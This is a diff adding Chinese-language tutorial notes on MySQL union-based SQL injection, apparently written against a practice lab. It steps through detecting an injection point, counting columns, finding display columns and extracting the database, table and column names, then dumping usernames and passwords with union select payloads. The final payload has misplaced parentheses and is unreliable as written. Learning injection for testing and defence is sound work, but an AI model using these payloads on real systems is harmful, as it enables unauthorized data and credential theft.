@@ -1,8 +1,44 @@
 ## SQL注入之MySQL
 
 ### 一、联合注入
-
-
+联合查询就是SQL语法中的union select语句。该语句会同时执行两条select语句，生成两张虚拟表，然后把查询到的结果进行拼接。</br>
+select ~~~~~~ union select~~~~~~</br>
+由于虚拟表是二维结构，联合查询会“纵向”拼接，两张虚拟的表。</br>
+ **-- （1）判断注入点**
+我们在可能存在SQL注入变量的后边添加以下payload：
+```python
+and 1=1 / and 1=2     回显页面不同(整形判断) 
+单引号判断‘ 显示数据库错误信息或者页面回显不同      (整形,字符串类型判断) 
+ \         (转义符) 
+-1/+1 回显下一个或上一个页面        (整型判断)
+```
+**-- （2）判断注入点为整型还是字符型**
+输入and 1=1和and 1=2后发现页面没有变化，判断不是整型注入。</br>
+输入’ and 1=1 %23和 ‘ and 1=2%23后发现页面变化，判断为字符注入。</br>
+**-- （3）使用order by推断字段数，即表中列的数量**
+ ```python
+order by 4%23        查看页面变化，页面报错说明没有4列，没有保存说明有4列，继续下一个数字的尝试
+```
+**-- （4）使用union，确认显示位，即会显示的字段**
+ ```python
+id=-1' union select 1,2,3    查看页面显示1,2,3的位置，即显示位
+```
+**-- （5）获取数据库名**
+ ```python
+id=-1' union select 1,database(),3--+      我们得出了数据库名叫security
+```
+**-- （6）获取数据库表名**
+ ```python
+id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security' limit 3,1),3
+```
+**-- （7）获取数据库表中所有字段**
+ ```python
+id=-1'union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),3
+```
+**-- （8）获取字段中数据**
+ ```python
+id=-1' union select 1,select( username from users limit 1,1),(select password from users limit 1,1)
+```
 ### 二、报错注入
 <font color=#FF000 >1、使用extractvalue函数</font></br>
 
